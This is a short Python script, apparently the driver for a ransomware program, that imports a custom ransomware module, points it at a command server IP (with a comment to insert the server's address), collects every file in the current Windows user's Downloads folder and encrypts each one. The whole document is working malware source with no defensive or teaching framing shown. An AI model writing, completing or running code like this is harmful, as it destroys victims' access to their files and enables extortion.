import os
import getpass
from ransomware import Ransomware

ransomware = Ransomware("127.0.0.1") # Insert the IP of the server as an arguement of the class

path = "C:\\Users\\" + getpass.getuser() + "\\Downloads\\"

files = []

for r, d, f in os.walk(path):
    for file in f:
      files.append(os.path.join(r, file))

for f in files:
  ransomware.encrypt(f, ransomware.key)